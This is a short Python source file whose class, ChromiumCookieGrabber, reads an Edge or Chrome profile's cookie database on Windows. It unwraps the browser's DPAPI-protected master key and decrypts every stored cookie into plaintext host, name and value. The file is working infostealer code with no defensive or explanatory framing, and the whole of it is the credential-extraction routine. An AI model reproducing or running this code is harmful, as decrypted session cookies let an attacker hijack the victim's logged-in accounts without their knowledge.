import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

class ChromiumCookieGrabber:
    def __init__(self, vendor = 'Microsoft', browser = 'Edge'):
        self.__cookies_filepath = os.path.join(os.environ['USERPROFILE'], r'AppData\Local', vendor, browser, r'User Data\Default\Network\Cookies')
        self.__localState_filepath = os.path.join(os.environ['USERPROFILE'], r'AppData\Local', vendor, browser, r'User Data\Local State')
        self.__master_key = self.__get_master_key()

    def __get_master_key(self):
        with open(self.__localState_filepath, "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def __decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def __generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def __decrypt_value(self, buff):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.__generate_cipher(self.__master_key, iv)
            decrypted_pass = self.__decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception as e:
            # print("Probably saved password from Chrome version older than v80\n")
            # print(str(e))
            return "Chrome < 80"

    def get_cookies(self):
        with sqlite3.connect(self.__cookies_filepath) as connection:
            connection.text_factory = bytes
            result = connection.execute('select host_key, name, encrypted_value from cookies')  # add other fields if you want
            for host_key, name, encrypted_value in result:
                value = self.__decrypt_value(encrypted_value)
                yield (bytes.decode(host_key), bytes.decode(name), value)
